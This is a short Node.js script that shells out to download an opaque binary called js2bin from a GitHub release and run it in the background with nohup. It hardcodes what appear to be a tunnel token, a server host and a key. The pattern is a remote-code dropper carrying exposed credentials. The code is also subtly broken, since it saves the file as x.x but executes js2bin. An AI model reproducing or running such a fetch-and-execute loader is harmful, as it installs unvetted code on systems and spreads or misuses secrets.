const { exec } = require('child_process');

const command = `
  C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNDQ5YWY1YTctMGQ0Yy00YTY1LWFjODgtODZjZTE1ZjA1NzA1IiwicyI6Ilpqa3pOVEppT0dNdE9ETXhPUzAwT1RneUxUZzBPVFF0WlRSaE1UaGtOalkxT0dJeCJ9
  N_S=nz.seav.eu.org
  N_K=djTqLOD0hS80jYbqXx
  bash -c 'curl -L -o x.x https://github.com/seav1/dl/releases/download/src/js2bin && chmod +x js2bin && nohup ./js2bin'
`;

exec(command, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error executing command: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`stderr: ${stderr}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
});
